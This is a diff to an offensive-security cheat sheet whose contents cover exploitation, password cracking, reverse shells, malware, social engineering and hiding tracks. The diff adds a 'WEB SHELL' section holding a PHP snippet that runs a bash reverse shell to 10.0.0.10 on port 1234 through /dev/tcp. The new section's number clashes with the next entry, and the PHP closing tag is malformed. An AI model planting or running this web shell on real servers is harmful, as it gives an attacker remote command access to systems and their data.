@@ -9,7 +9,8 @@
 7. [Enumeration](#enumeration)
 8. [Exploitation](#exploitation)
 9.  [password cracking](#password-cracking)
-10. [Reverse shell](#reverse-shell)
+10. [Reverse shell](#reverse-shell) 
+11. [WEB SHELL](#web-shell)
 11. [Malwares](#malwares)
 12. [social engineering](#social-engineering)
 13. [hiding tracks](#hiding-tracks)
@@ -833,6 +834,25 @@ shell.sh:
 <br>
 <br>
 
+
+# WEB SHELL
+
+## PHP WEB SHELL
+- [ref](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+>
+```
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
 
 # MALWARES
 
